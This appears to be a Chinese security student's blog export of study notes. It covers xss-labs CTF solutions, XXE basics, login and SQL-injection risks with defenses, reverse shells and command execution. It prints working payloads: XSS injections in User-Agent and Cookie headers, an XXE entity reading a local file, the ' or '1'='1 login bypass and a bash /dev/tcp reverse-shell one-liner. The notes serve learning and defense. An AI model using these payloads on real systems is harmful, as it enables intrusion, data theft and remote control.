<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input name=&quot;t_ua&quot; value=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>bp时，很明显是</p>
<p><code>User-Agent:&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code></p>
<h3 id="level13-Cookie"><a href="#level13-Cookie" class="headerlink" title="level13(Cookie)"></a>level13(Cookie)</h3><p>f12，看到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input name=&quot;t_cook&quot; value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>这应该提示了cookie</p>
<p>bp试试</p>
<p><code>Cookie: user=&quot; onclick=&quot;alert(1)&quot; type=&quot;text</code></p>
<h3 id="level14-exif"><a href="#level14-exif" class="headerlink" title="level14(exif)"></a>level14(exif)</h3><p>待解决</p>
<h3 id="level15-ngInclude"><a href="#level15-ngInclude" class="headerlink" title="level15(ngInclude)"></a>level15(ngInclude)</h3><p>url:</p>
<p><code>http://localhost:81/xss-labs/level15.php?src=1.gif</code></p>
<p>f12出现这个：</p>
<p><img src="/../../../Typora/img111/image-20230520133632333.png" alt="image-20230520133632333"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level15&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到第15关，自己想个办法走出去吧！&lt;/h1&gt;</span><br><span class="line">&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;src&quot;];</span><br><span class="line">echo &#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;;</span><br></pre></td></tr></table></figure>

<p>知识点：ng-include</p>
<p>ng-include是angular js的东西，类似php函数中的include函数，即包含文件。</p>
<p>1、ng-include 指令用于包含外部的 HTML文件。</p>
<p>2、包含的内容将作为指定元素的子节点。</p>
<p>3、ng-include 属性的值可以是一个表达式，返回一个文件名。</p>
<p>4、默认情况下，包含的文件需要包含在同一个域名下。</p>
<p>值得注意的是：</p>
<p>ng-include,如果单纯指定地址，必须要加引号</p>
<p>ng-include,加载外部html，script标签中的内容不执行</p>
<p>ng-include,加载外部html中含有style标签样式可以识别<br>参考：<a href="https://blog.csdn.net/RuoLi_s/article/details/112690177?ops_request_misc=&request_id=&biz_id=102&utm_term=xss-labs%E9%80%9A%E5%85%B3&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-112690177.first_rank_v2_pc_rank_v29&spm=1018.2226.3001.4187">xss-labs通关挑战（xss challenge）_RuoLi_s的博客-CSDN博客</a></p>
<p>把其他存在xss漏洞的文件包含进来。</p>
<p><code>src=&#39;level1.php?name=&lt;a href=javascript:alert(1)&gt;&#39;</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520135939252.png" alt="image-20230520135939252"></p>
<h3 id="level16-空格绕过"><a href="#level16-空格绕过" class="headerlink" title="level16(空格绕过)"></a>level16(空格绕过)</h3><p>源代码为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;	&quot;,&quot;&amp;nbsp;&quot;,$str4);</span><br><span class="line">echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str5).&quot;&lt;/h3&gt;&quot;;</span><br></pre></td></tr></table></figure>

<p>主要是script替换了，空格实体化了，”&#x2F;“也没了</p>
<p>试试img，并且替换个空格</p>
<p>%0a试试。</p>
<p><code>keyword=</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520142552842.png" alt="image-20230520142552842"></p>
<h3 id="level17-18-参数拼接"><a href="#level17-18-参数拼接" class="headerlink" title="level17-18(参数拼接)"></a>level17-18(参数拼接)</h3><p>url两个参数，中间有&#x3D;</p>
<p><code>arg01=%20onmouseover&amp;arg02=alert(1)</code></p>
<p>onmouseover前加个空格</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230520154125903.png" alt="image-20230520154125903"></p>
<p>level18同理。</p>
<h3 id="level19-20-Flash反编译"><a href="#level19-20-Flash反编译" class="headerlink" title="level19-20(Flash反编译)"></a>level19-20(Flash反编译)</h3><p>待解决</p>
]]></content>
      <categories>
        <category>xss</category>
      </categories>
      <tags>
        <tag>xss</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>xxe与xml</title>
    <url>/2023/05/30/xxe%E4%B8%8Exml/</url>
    <content><![CDATA[<h3 id="1-参考"><a href="#1-参考" class="headerlink" title="1.参考"></a>1.参考</h3><p><a href="https://xz.aliyun.com/t/12325">对于XXE的理解 - 先知社区 (aliyun.com)</a></p>
<p><a href="http://t.csdn.cn/zUo5a">http://t.csdn.cn/zUo5a</a></p>
<h3 id="2-前置知识"><a href="#2-前置知识" class="headerlink" title="2.前置知识"></a>2.前置知识</h3><p>xml被设计为<strong>传输和存储数据</strong>，xml文档结构包括：</p>
<p>xml声明</p>
<p>DTD文档类型定义(漏洞所在之处)</p>
<p>文档元素</p>
<p>焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。</p>
<p>xxe（xml external entity injection），即xml外部实体注入漏洞，xxe漏洞发生在应用程序解析xml输入时，<strong>没有禁止外部实体的加载</strong>，导致加载了恶意外部文件，造成文件读取、命令执行、内网攻击、DOS攻击等危害。</p>
<h4 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h4><p>没有禁止外部实体解析</p>
<h4 id="xml与html主要差异"><a href="#xml与html主要差异" class="headerlink" title="xml与html主要差异"></a>xml与html主要差异</h4><p>xml被设计为传输和存储数据，焦点是数据的内容；</p>
<p>html被设计用来显示数据，焦点是数据的外观；</p>
<p>html旨在显示信息，而xml旨在传输信息。</p>
<h4 id="xml文档"><a href="#xml文档" class="headerlink" title="xml文档"></a>xml文档</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">第一部分：XML声明部分</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"> </span><br><span class="line">第二部分：文档类型定义 DTD</span><br><span class="line"><span class="comment">&lt;!--定义此文档是note类型的文档--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span>[ </span></span><br><span class="line"><span class="meta">  &lt;!--定义 note 元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  &lt;!--定义 to 元素为 &quot;#PCDATA&quot; 类型--&gt;</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">to</span>      (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">from</span>    (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">body</span>    (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!--外部实体声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;!-- 形如: <span class="meta">&lt;!DOCTYPE 根元素 <span class="keyword">SYSTEM</span> <span class="string">&quot;文件名&quot;</span>&gt;</span> --&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">entity-name</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;URI/URL&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"> </span><br><span class="line">第三部分：文档元素</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line">————————————————</span><br><span class="line">版权声明：本文为CSDN博主「angry_program」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。</span><br><span class="line">原文链接：https://blog.csdn.net/angry_program/article/details/104448524/</span><br></pre></td></tr></table></figure>

<p>注意事项：</p>
<p>xml里大小写严格区分；</p>
<p>且只有一个根元素（包含所有其他元素，如students）</p>
<p>黑盒可以通过抓包后查看数据格式类型和Content-Type值(text&#x2F;xml、application&#x2F;xml)判断；</p>
<p>更改Content-Type，查看返回</p>
<h4 id="自定义实体语法"><a href="#自定义实体语法" class="headerlink" title="自定义实体语法"></a><strong>自定义实体语法</strong></h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素[</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY 实体名 <span class="string">&quot;实体内容&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"> ]&gt;</span></span><br><span class="line"></span><br><span class="line">引用已定义的实体：</span><br><span class="line"></span><br><span class="line">　　　　&amp;实体名;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">① 内部申明格式</span><br><span class="line">&lt;!DOCTYPE 根元素 [元素申明]&gt;</span><br><span class="line">DTD例子:  &lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br><span class="line">XML例子:  &lt;author&gt;&amp;writer;&lt;/author&gt;</span><br><span class="line">注释: 一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">② 外部引用DTD格式</span><br><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;外部DTD的URI&quot;&gt;</span><br><span class="line">DTD例子:  &lt;!ENTITY writer SYSTEM &quot;http://www.***.com/dtd/entities.dtd&quot;&gt;</span><br><span class="line">XML例子:  &lt;author&gt;&amp;writer;&lt;/author&gt;</span><br><span class="line"> </span><br><span class="line">③ 引用公共DTD格式</span><br><span class="line">&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD标识名&quot; &quot;公共DTD的URI&quot;&gt;</span><br></pre></td></tr></table></figure>



<h5 id="读文件内容"><a href="#读文件内容" class="headerlink" title="读文件内容"></a>读文件内容</h5><h6 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version =&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY xxe SYSTEM &quot;file:///d:/1.txt&quot;&gt;</span><br><span class="line"> </span><br><span class="line"> ]&gt;</span><br><span class="line"></span><br><span class="line"> &lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure>

<p>这是一种外部实体应用方法</p>
<h6 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h6><p>。。。</p>
<h5 id="内网探针或攻击内网应用-触发漏洞地址"><a href="#内网探针或攻击内网应用-触发漏洞地址" class="headerlink" title="内网探针或攻击内网应用(触发漏洞地址)"></a>内网探针或攻击内网应用(触发漏洞地址)</h5><h5 id="RCE执行"><a href="#RCE执行" class="headerlink" title="RCE执行"></a>RCE执行</h5><p>安装了expect扩展的php环境里执行系统命令</p>
<h5 id="引入外部实体dtd"><a href="#引入外部实体dtd" class="headerlink" title="引入外部实体dtd"></a>引入外部实体dtd</h5>]]></content>
      <categories>
        <category>xxe</category>
        <category>xml</category>
      </categories>
      <tags>
        <tag>xxe</tag>
        <tag>xml</tag>
      </tags>
  </entry>
  <entry>
    <title>业务流程</title>
    <url>/2023/06/11/%E4%B8%9A%E5%8A%A1%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="一、基本业务"><a href="#一、基本业务" class="headerlink" title="一、基本业务"></a>一、基本业务</h1><h2 id="1-用户注册"><a href="#1-用户注册" class="headerlink" title="1.用户注册"></a>1.用户注册</h2><p>​	隐患及解决方式：</p>
<blockquote>
<p>1.用户重复注册；利用token机制</p>
<p>2.不校验用户注册数据（比如，注册时，admin与admin空格；数据库会认为同一个用户）；后台用过滤函数即可。</p>
<p>3.频繁的用户批量注册：</p>
<p>​	1.对相同用户信息注册频率限制：</p>
<p>​		单IP注册频率限制、表单加验证码、需要姓名加身份证认证</p>
<p>​	2.采用二次身份校验技术</p>
<p>​		需要验证用户邮箱、手机绑定验证</p>
</blockquote>
<p>但是，所有的限制手段的目的均为提升批量注册的难度，但无法从根本上阻止恶意用户，因为系统无法识别用户注册的真实意图。因此从防御视角来看，应尽可能提高恶意注册的难度，使批量注册的成本高于从网站获取到的利益，这样为解决此问题的唯一思路。</p>
<h2 id="2-用户登录"><a href="#2-用户登录" class="headerlink" title="2.用户登录"></a>2.用户登录</h2><p>1.用户名常见、密码太简单（弱口令爆破）：</p>
<p>​	1）限制用户名&#x2F;密码验证速率。</p>
<p>​	2）连续三次输入错误后采用验证码等手段进行限制。</p>
<p>​	3）提升用户密码强度及位数（较难执行，用户不遵守的情况较多）。</p>
<p>​	4）定期修改密码（在实践中基本上无法做到，仅适用于极个别企业内网系统）。</p>
<p>2.sql注入的万能密码</p>
<p>​	关键是构造使用or的数据库查询语句，并添加恒等式，实现数据库对用户输入的密码查询结果永远正确。</p>
<p>比如输入</p>
<p><code>&#39; or &#39;1&#39;=&#39;1</code></p>
<p>后台处理为：</p>
<p><code>select * from user where name= &#39;admin&#39; and passwd= &#39;&#39; or &#39;1&#39;=&#39;1&#39;；</code></p>
<p>然后还有用户名注释嘞，<code>admin&#39; -- s 密码随意</code></p>
<p>后台处理为：<code>select * from user where name= &#39;admin&#39;</code> – s and …</p>
<p>预防的话：</p>
<blockquote>
<p>限制用户名及密码可使用字符，不符合要求的直接过滤，避免单引号、数据库注释符等SQL注入行为发生。</p>
<p>在PHP+MySQL环境下，推荐采用mysql_real_escape_string（）函数实现对输入数据的过滤，mysql_real_escape_string（）函数转义SQL语句中使用的字符串中的特殊字符。</p>
<p>开启此功能后，下列字符受影响：\x00、\n、\r、\、’、”、\x1a。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618142621477.png"></p>
<p>用户Session校验</p>
<h2 id="3-密码找回"><a href="#3-密码找回" class="headerlink" title="3.密码找回"></a>3.密码找回</h2><p>验证步骤可跳过</p>
<p>平行越权</p>
<p>弱token</p>
<p>Session覆盖</p>
<h2 id="4-用户越权"><a href="#4-用户越权" class="headerlink" title="4.用户越权"></a>4.用户越权</h2><p>​	RBAC模型（基于角色的访问控制）</p>
<p>主要是Web系统能定制各类业务，能快速实现各类不同应用场景及功能。不好总结。</p>
<h1 id="二、标准业务"><a href="#二、标准业务" class="headerlink" title="二、标准业务"></a>二、标准业务</h1><p>一台物理服务器、一个互联网接口、一个固定IP及域名就可以构建一个基本的Web网站。</p>
<p>也可利用目前各类云服务器（如阿里云）并配合相应的CMS，就可在半小时内快速建站，网站的速度及美观性均可满足用户基本需求，而且提供完备的站点管理措施及内容更新方式。</p>
<h2 id="系统管理者面临的问题"><a href="#系统管理者面临的问题" class="headerlink" title="系统管理者面临的问题"></a>系统管理者面临的问题</h2><p>1.如何建设</p>
<blockquote>
<p>开发人员根据Web功能需求开发网站。这样涉及的问题会非常多，目前也有非常成熟的开发体系及防护方案。</p>
</blockquote>
<blockquote>
<p>中小站长由于时间及技术实力的问题，通常会选择各类CMS架设网站。</p>
</blockquote>
<p>2.如何管理</p>
<blockquote>
<p>远程登录服务器，在操作系统层面实现本地对文件的修改。</p>
<p>远程登录数据库，直接管理数据库等。</p>
<p>建设管理后台，实现对网站的应用层面管理等。</p>
</blockquote>
<p>3.用户怎么用</p>
<blockquote>
<p>网站交互功能越多，面临的安全风险就越高，这点毋庸置疑。一个静态网站无论如何也不会出现各类安全漏洞。这里不包含伪静态网站，伪静态网站只是将参数转换为路径（如？a&#x3D;1转换为&#x2F;a&#x2F;1），这在攻击者看来没有什么难度。</p>
</blockquote>
<blockquote>
<p>攻击者使用的范围并不会比正常用户广。因此，攻击者会从各项应用点进行考虑并分析，寻找安全隐患，如Web传参点等。</p>
</blockquote>
<h2 id="CMS及其特征"><a href="#CMS及其特征" class="headerlink" title="CMS及其特征"></a>CMS及其特征</h2><p>CMS（Content Management System）即内容管理系统，通常指一套完整的网站模板或建站系统。</p>
<p>CMS已设计好一套标准的使用环境，包括完整的前后台逻辑等。用户只需要将CMS部署在Web服务器上，添加相应内容、修改站点样式即可完成网站的制作。国内目前大量的论坛及个人博客均采用CMS进行架设。</p>
<blockquote>
<p>Discuz 、Ecshop、phpcms等</p>
</blockquote>
<p>从安全角度考虑，CMS的安全问题主要有：</p>
<p>1）整个网站系统依托于CMS，如果CMS突然爆发高危漏洞，则站点会受到影响。</p>
<p>2）CMS默认会在根目录中有setup页面。很多网站管理员在CMS安装完毕后如不及时删除它，则很容易留下被覆盖攻击的隐患。</p>
<p><strong>CMS比较适合运维人员少或无专职运维人员的个人及中小型企业者</strong></p>
<p>利用CMS建站时，建议采取以下手段，可有效保障Web系统的安全。</p>
<p>1）及时升级CMS系统版本，保证版本最新。</p>
<p>2）尽可能少利用CMS的扩展插件，尤其是WordPress。</p>
<p>3）上线完毕后删除默认安装脚本。</p>
<p>4）务必修改默认密码、CMS标识等。</p>
<p>CMS系统无论怎么修改，其中一些特征依然可被攻击者轻易识别，之后再利用目标CMS版本对应的漏洞进行攻击尝试。利用搜索引擎进行搜索即可发现大量此类内容，点击进入之后可看到相关的标识：以discuz！为例，它常用于各类站点首页的标识。不过，部分管理员会对其进行修改。</p>
<blockquote>
<p>powered by Discuz! X3.2 技术支持。。。。</p>
</blockquote>
<p>还有，源代码也可能有这种信息。</p>
<p>当然了，目标站点的CMS及对应版本号这些基本信息，可能低危漏洞都算不上，但对于攻击者来说，是个考虑是继续渗透还是放弃的信息。</p>
<h2 id="常见远程管理方式"><a href="#常见远程管理方式" class="headerlink" title="常见远程管理方式"></a>常见远程管理方式</h2><h3 id="Windows远程登录"><a href="#Windows远程登录" class="headerlink" title="Windows远程登录"></a>Windows远程登录</h3><p>RDP协议（Remote Desktop Protocol，远程桌面协议）可使Windows系统之间进行互相的远程访问，默认利用3389端口。</p>
<p>它虽不存在什么漏洞，但攻击者可能利用其他方式对现有系统提权后并创建账号，再直接利用新创建账号远程登录即可。</p>
<h3 id="Linux-SSH22端口"><a href="#Linux-SSH22端口" class="headerlink" title="Linux SSH22端口"></a>Linux SSH22端口</h3><p><strong>（Windows使用putty进行SSH登录）</strong></p>
<p>命令嘛，工具也可以。</p>
<p>ssh ...@… </p>
<p>攻击者攻击Web应用的主要原因是想获得Web应用所在服务器的权限，进而作为跳板攻击内网。当攻击者获得webshell后，接下来就会进行提权并开放远程管理权限。因此，远程管理很多时候方便运维人员开展，但在一定程度上也为攻击者提供了远程连接的通道。</p>
<h3 id="Web应用管理后台"><a href="#Web应用管理后台" class="headerlink" title="Web应用管理后台"></a>Web应用管理后台</h3><p>注意不要在前台放后台管理链接，</p>
<p>否则</p>
<blockquote>
<p>在前台可利用SQL注入、XSS盲打等手段获取后台用户的登录凭证</p>
</blockquote>
<p>也避免被路径扫描到后台路径，Web应用管理后台起得复杂一点。</p>
<p>针对后台管理业务的安全，重点在于登录用户管理阶段，如管理员登录、密码找回，越权等。</p>
<h3 id="数据库开放远程管理"><a href="#数据库开放远程管理" class="headerlink" title="数据库开放远程管理"></a>数据库开放远程管理</h3><p>在正常网站运行时，数据库只需与Web服务器进行通信。如果站（网站）库（数据库）为一体部署，那么在本地通信即可。但在真实环境中，MySQL默认数据库远程管理处于关闭状态，考虑到维护的方便，部分系统均会考虑打开远程数据库接口。管理员可利用各类数据库管理工具实现远程登录。</p>
<p>启用远程管理的安全隐患包括：</p>
<p>1）如果存在弱密码，则直接可能被攻击者登录并获取数据。</p>
<p>2）可远程爆破MySQL密码。</p>
<p>3）如果攻击者已获得webshell，则会在页面中寻找数据库连接密码，再进行远程连接。</p>
<p>以上任何一种隐患可能均会对数据库安全造成极大影响，因此建议<strong>关闭数据对外连接端口</strong>。如需远程维护，考虑利用VPN等先连接到内网再进行访问。</p>
<h3 id="在线编辑器"><a href="#在线编辑器" class="headerlink" title="在线编辑器"></a>在线编辑器</h3><p>如果有上传文件功能，那就存在文件上传漏洞。</p>
<p>以fckeditor为例，可将编辑器结合在网页中，实现功能强大的上传点。</p>
<p>目前此类问题主要存在于大量已运行多年的Web应用系统中，新建系统基本不存在此类问题。</p>
]]></content>
      <categories>
        <category>《WEB安全基础》</category>
        <category>业务流程</category>
      </categories>
      <tags>
        <tag>《WEB安全基础》</tag>
        <tag>业务流程</tag>
      </tags>
  </entry>
  <entry>
    <title>反弹shell</title>
    <url>/2023/05/31/%E5%8F%8D%E5%BC%B9shell/</url>
    <content><![CDATA[<h2 id="1-参考文章"><a href="#1-参考文章" class="headerlink" title="1.参考文章"></a>1.参考文章</h2><p>版权声明：本文为CSDN博主「云淡.风轻」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_45584159/article/details/111489653">https://blog.csdn.net/qq_45584159/article/details/111489653</a></p>
<h2 id="2-shell"><a href="#2-shell" class="headerlink" title="2.shell"></a>2.shell</h2><p>shell就是实现用户命令的接口，通过该接口我们能实现对计算机的控制(root权限)， 而反弹shell就是将shell反弹给攻击者，从而达到让攻击者可以在自己的机器上执行shell命令， 从而操控受害者的计算机。</p>
<h2 id="3-为什么要反弹shell"><a href="#3-为什么要反弹shell" class="headerlink" title="3.为什么要反弹shell"></a>3.为什么要反弹shell</h2><p>攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。</p>
<p>以下情况无法正向连接：</p>
<p>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p>
<p>2.它的ip会动态改变，你不能持续控制。</p>
<p>3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p>
<p>4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</p>
<p> 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p>
<h2 id="3-反弹前提"><a href="#3-反弹前提" class="headerlink" title="3.反弹前提"></a>3.反弹前提</h2><p>第一步：要有一个可以被监听的端口，通常使用nc命令。<br>eg：nc -lvp 6767</p>
<p>解析：-l 监听，-v 输出交互或出错信息，-p 端口。nc是netcat的简写，可实现任意TCP&#x2F;UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口。</p>
<p>第二步：要产生一个交互式的shell，使用bash -i</p>
<p>解析：bash 是linux 的一个比较常见的shell,其实linux的shell还有很多，比如 sh、zsh、等，他们之间有着细小差别， -i 这个参数表示的是产生交互式的shell</p>
<p>第三步：我们为什么要监听一个端口，就是因为存在一个特殊设备文件(&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;root)，如果你在任何一方监听端口的情况下对这个文件进行读写，就能实现与监听端口的服务器(即攻击者(攻击者作为服务器，而受害者作为客户端，反弹shell就是让受害者主动与服务端-攻击者建立通信))的socket通信。</p>
<p>特殊设备文件（Linux一切皆文件），实际这个文件是不存在的，它只是 bash 实现的用来实现网络请求的一个接口。打开这个文件就相当于发出了一个socket调用并建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。</p>
<p>&#x2F;dev&#x2F;tcp|udp&#x2F;ip&#x2F;port 这个文件是特别特殊的，实际上可以将其看成一个设备（Linux下一切皆文件），其实如果你访问这个文件的位置他是不存在的。</p>
<h2 id="4-重定向"><a href="#4-重定向" class="headerlink" title="4.重定向"></a>4.重定向</h2><p>有时候需要让文件内容输出到其他设备。</p>
<p>（1）输入重定向 &lt; &lt;&lt;<br>（2）输出重定向 &gt; &gt;&gt;</p>
<p>重定向就是针对文件描述符的操作</p>
<h3 id="bash反弹"><a href="#bash反弹" class="headerlink" title="bash反弹"></a>bash反弹</h3><p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 0&gt;&amp;1</p>
<p>bash -i 产生一个bash交互环境</p>
<p>&gt;&amp; 将联合符号前面的内容与后面结合然后一起重定向给后者</p>
<p>&#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 主机与目标机建立一个TCP连接</p>
<p>0&gt;&amp;1 标准的输入与标准输出一起重定向给标准输出的内容</p>
<h3 id="NC反弹"><a href="#NC反弹" class="headerlink" title="NC反弹"></a>NC反弹</h3><p>nc -lvnp 6666</p>
<h3 id="python反弹"><a href="#python反弹" class="headerlink" title="python反弹"></a>python反弹</h3>]]></content>
      <categories>
        <category>反弹shell</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>反弹shell</tag>
      </tags>
  </entry>
  <entry>
    <title>中间件介绍</title>
    <url>/2023/06/01/%E4%B8%AD%E9%97%B4%E4%BB%B6/</url>
    <content><![CDATA[<h1 id="1-定义"><a href="#1-定义" class="headerlink" title="1.定义"></a>1.定义</h1><p>介于操作系统和应用软件之间，为应用软件提供服务功能的软件，有消息中间件，交易中间件，应用服务器等。由于介于两种软件之间，所以，称为中间件</p>
<h1 id="2-常见中间件"><a href="#2-常见中间件" class="headerlink" title="2.常见中间件"></a>2.常见中间件</h1><h2 id="1-Tomcat"><a href="#1-Tomcat" class="headerlink" title="1.Tomcat"></a>1.Tomcat</h2><p>包括<strong>站点、连接器、应用上下文、资源</strong>四个部分。</p>
<ol>
<li><h3 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h3></li>
</ol>
]]></content>
      <categories>
        <category>中间件</category>
      </categories>
      <tags>
        <tag>中间件</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2023/06/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title: 命令执行</span><br><span class="line">categories: </span><br><span class="line">- 《WEB安全基础》</span><br><span class="line">- 命令执行</span><br><span class="line">date: 2023-06-11 9:12:30</span><br><span class="line">tags: </span><br><span class="line">- 《WEB安全基础》</span><br><span class="line">- 命令执行</span><br></pre></td></tr></table></figure>

<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>效果类似包含攻击，主要是由于输入的参数被当成命令来执行。</p>
<h2 id="远程命令执行漏洞"><a href="#远程命令执行漏洞" class="headerlink" title="远程命令执行漏洞"></a>远程命令执行漏洞</h2><h3 id="1-利用系统函数实现"><a href="#1-利用系统函数实现" class="headerlink" title="1.利用系统函数实现"></a>1.利用系统函数实现</h3><p>在PHP下，允许远程命令执行的函数有eval（）、assert（）、preg_replace（）、call_user_func（）。如果页面中存在上述函数且其参数可被用户控制，同时没有对参数做有效的过滤，那么就可能存在远程命令执行漏洞。</p>
<h4 id="1-eval（）与assert（）函数的区别"><a href="#1-eval（）与assert（）函数的区别" class="headerlink" title="1.eval（）与assert（）函数的区别"></a>1.eval（）与assert（）函数的区别</h4><p>eval（）与assert（）函数在执行效果上基本相同，均可动态执行代码，且接收的参数为字符串。assert（）函数虽然也会执行参数内的代码，但主要用来判断一个表达式是否成立，并返回true或false。实战中，eval（）函数通常会被系统禁用，因此在一句话木马中通常利用assert（）来实现代码执行。</p>
